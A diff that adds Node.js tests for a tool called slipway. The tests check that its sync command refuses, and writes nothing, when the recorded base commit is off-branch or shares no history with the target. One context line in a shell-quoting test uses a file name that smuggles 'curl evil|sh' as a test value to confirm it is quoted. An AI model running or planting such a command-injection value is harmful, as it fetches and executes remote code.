@@ -354,6 +354,87 @@ test('a manifest recorded before slipway rewrote its history: names the closest 
   assert.equal(manifestOf(dir).slipway, A);
 });
 
+// A source that serves a commit no branch holds, as GitHub does for a history it rewrote: a partial clone of
+// it fetches that commit on demand, so an existence check finds it. `orphan` ships A's tree but for one file.
+function sourceWithUnreachable(text) {
+  const dir = join(root, `slipway-promisor-${++n}`);
+  git(root, 'clone', '-q', slip, dir);
+  git(dir, 'config', 'uploadpack.allowFilter', 'true');
+  git(dir, 'config', 'uploadpack.allowAnySHA1InWant', 'true');
+  git(dir, 'checkout', '-q', '--orphan', 'gone', A);
+  put(dir, { 'process/same.md': text });
+  const orphan = commit(dir, 'the version before the rewrite');
+  git(dir, 'checkout', '-q', 'main');
+  git(dir, 'branch', '-q', '-D', 'gone');
+  return { url: `file://${dir}`, orphan };
+}
+
+test('a recorded commit that exists in the source but on no branch is not the base: sync refuses as it does for a rewritten history (#84)', () => {
+  const old = 'the text before the rewrite\n';
+  const { url, orphan } = sourceWithUnreachable(old);
+  // The trap: the clone sync makes finds the commit, and the walk does not reach it.
+  const gitDir = sourceClone(url);
+  assert.equal(git(gitDir, 'cat-file', '-t', orphan), 'commit');
+  assert.ok(!git(gitDir, 'rev-list', 'HEAD').split('\n').includes(orphan));
+  const dir = project((d) => {
+    const m = JSON.parse(readFileSync(join(d, MANIFEST), 'utf8'));
+    m.source = url;
+    m.slipway = orphan;
+    m.files['process/same.md'].blob = execFileSync('git', ['hash-object', '--stdin'], { input: old, encoding: 'utf8' }).trim();
+    m.files['process/same.md'].sha256 = sha256(Buffer.from(old));
+    writeFileSync(join(d, MANIFEST), `${JSON.stringify(m, null, 2)}\n`);
+    put(d, { 'process/same.md': old });
+    commit(d, 'as adopted before the rewrite');
+  });
+  const before = treeHash(dir);
+  for (const args of [[], ['--apply']]) {
+    const r = sync(dir, ...args);
+    assert.equal(r.status, 1, r.stdout);
+    assert.equal(r.stdout, '', 'a plan printed for a base that is gone');
+    assert.match(r.stderr, /^sync: slipway's history was changed after this project recorded its version/);
+    assert.match(r.stderr, new RegExp(`nearest one is ${A0.slice(0, 12)}, which differs in:\\n {2}process/same\\.md\\n`));
+    assert.match(r.stderr, new RegExp(`sync --adopt --apply --base ${A0} --revert process/same\\.md\\n`));
+    assert.match(r.stderr, /Nothing was written\.$/m);
+    assert.equal(treeHash(dir), before, 'sync wrote to the project');
+  }
+});
+
+test('resolveBase: a start commit the walk does not reach is not tried first (#84)', () => {
+  const { url, orphan } = sourceWithUnreachable('old\n');
+  const gitDir = sourceClone(url);
+  const blobs = new Map([['process/same.md', git(gitDir, 'rev-parse', `${orphan}:process/same.md`)]]);
+  const r = resolveBase(gitDir, blobs, { start: orphan });
+  assert.equal(r.exact, null);
+  assert.notEqual(r.best.sha, orphan);
+  assert.equal(resolveBase(gitDir, blobs, { start: orphan }).total, resolveBase(gitDir, blobs).total);
+});
+
+test('a target that shares no history with the base is refused in the plan and in --apply, with no commit list (#84)', () => {
+  // The running slipway is a commit with a history of its own, and the source (the manifest's) holds it on a branch.
+  const unrelated = join(root, 'slipway-unrelated');
+  git(root, 'clone', '-q', slip, unrelated);
+  git(unrelated, 'checkout', '-q', '--orphan', 'fresh');
+  put(unrelated, { 'process/same.md': 'a history of its own\n' });
+  commit(unrelated, 'a slipway with no shared history');
+  const source = join(root, 'slipway-holds-both');
+  git(root, 'clone', '-q', slip, source);
+  git(source, 'fetch', '-q', unrelated, 'fresh:other');
+  const dir = project((d) => {
+    const m = JSON.parse(readFileSync(join(d, MANIFEST), 'utf8'));
+    m.source = source;
+    writeFileSync(join(d, MANIFEST), `${JSON.stringify(m, null, 2)}\n`);
+    commit(d, 'a source that holds both');
+  });
+  const before = treeHash(dir);
+  for (const args of [[], ['--apply']]) {
+    const r = spawnSync(process.execPath, [join(unrelated, 'scripts', 'new-project.mjs'), 'sync', ...args], { cwd: dir, encoding: 'utf8' });
+    assert.equal(r.status, 1, r.stdout);
+    assert.doesNotMatch(r.stdout, /Nothing needs you|commits, base → target/);
+    assert.match(r.stderr, /share no history in \S+, so sync cannot say what changed between them; nothing was written/);
+    assert.equal(treeHash(dir), before, 'sync wrote to the project');
+  }
+});
+
 test('the re-point command quotes a path the shell would read as more than a name', () => {
   assert.equal(shellQuote('process/a.md'), 'process/a.md');
   assert.equal(shellQuote('x;curl evil|sh;.md'), "'x;curl evil|sh;.md'");
